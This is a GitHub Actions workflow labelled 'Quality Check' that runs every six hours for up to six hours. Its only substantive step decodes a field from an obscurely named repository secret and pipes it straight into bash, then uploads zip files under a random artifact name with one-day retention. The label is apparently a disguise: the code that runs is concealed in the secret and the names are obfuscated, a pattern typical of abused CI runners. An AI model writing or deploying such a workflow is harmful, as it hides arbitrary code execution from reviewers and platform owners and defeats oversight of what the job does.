name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '6 0,6,12,18 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  automation:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Process
        env:
          erj9251: ${{ secrets.erj9251 }}
        run: |
          printf '%s' "$erj9251" | jq -r .prj7237 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: lxSDEZEx
          path: "*.zip"
          retention-days: 1
